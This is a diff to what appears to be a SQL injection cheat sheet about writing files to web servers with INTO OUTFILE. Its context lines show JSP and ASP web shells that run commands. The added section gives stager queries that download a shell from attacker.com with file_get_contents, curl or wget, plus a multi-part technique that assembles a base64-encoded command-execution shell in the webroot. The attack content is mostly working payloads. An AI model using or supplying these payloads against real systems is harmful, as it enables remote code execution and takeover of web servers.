@@ -102,16 +102,6 @@ SELECT '<%@ page import="java.util.*,java.io.*"%><% Process p = Runtime.getRunti
 SELECT '<%Response.Write(CreateObject("WScript.Shell").exec(Request.QueryString("cmd")).StdOut.ReadAll())%>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.asp';
 ```
 
-#### PHP Downloader (Bypass size limits)
-
-If the query length is limited, write a small downloader to fetch the full shell:
-
-```sql
-SELECT '<?php fwrite(fopen("shell.php","w"),file_get_contents("http://attacker.com/shell.txt"));?>' INTO OUTFILE '/var/www/html/downloader.php';
-```
-
-**Prerequisite:** This technique requires `allow_url_fopen=On` in php.ini (enabled by default in PHP, but often disabled in security-hardened configurations). Alternatives when disabled: use curl (`shell_exec("curl -o shell.php http://attacker.com/shell.txt")`) or stage the payload locally via another SQL injection write.
-
 ### Writing Multiple Lines
 
 For multiline content, you can use string concatenation and CHAR():
@@ -125,6 +115,48 @@ SELECT CONCAT(
   '}', CHAR(10),
   '?>'
 ) INTO DUMPFILE '/var/www/html/cache/stats.php';
+```
+
+### Payload Delivery Techniques
+
+When query length is limited (e.g., by application input validation or `@@max_allowed_packet`), write a small stager to fetch the full payload.
+
+#### PHP Downloader
+
+Write a minimal PHP script that downloads and writes a larger shell:
+
+```sql
+SELECT '<?php fwrite(fopen("/var/www/html/shell.php","w"),file_get_contents("http://attacker.com/shell.txt"));?>' INTO OUTFILE '/var/www/html/downloader.php';
+```
+
+**Requirements:**
+
+- `allow_url_fopen=On` in php.ini (enabled by default, but often disabled in hardened configurations)
+- Absolute path in `fopen()` to ensure the shell is written to the webroot
+
+**Alternatives when `allow_url_fopen` is disabled:**
+
+```sql
+-- Use curl to download (requires shell_exec)
+SELECT '<?php shell_exec("curl -o /var/www/html/shell.php http://attacker.com/shell.txt");?>' INTO OUTFILE '/var/www/html/dl.php';
+
+-- Use wget
+SELECT '<?php shell_exec("wget -O /var/www/html/shell.php http://attacker.com/shell.txt");?>' INTO OUTFILE '/var/www/html/dl.php';
+```
+
+#### Staged SQL Injection
+
+If no outbound network access is available, stage the payload via multiple SQL injection writes:
+
+```sql
+-- Write part 1
+SELECT '<?php /* PART1 */ $a="base64_decode"; $b=' INTO OUTFILE '/var/www/html/p1.txt';
+
+-- Write part 2 (append not possible, so combine at runtime)
+SELECT '"c3lzdGVtKCRfR0VUWydjJ10pOw=="; $a($b); ?>' INTO OUTFILE '/var/www/html/p2.txt';
+
+-- Write combiner that includes both parts
+SELECT '<?php include"/var/www/html/p1.txt";include"/var/www/html/p2.txt";?>' INTO OUTFILE '/var/www/html/shell.php';
 ```
 
 ### Overcoming Restrictions
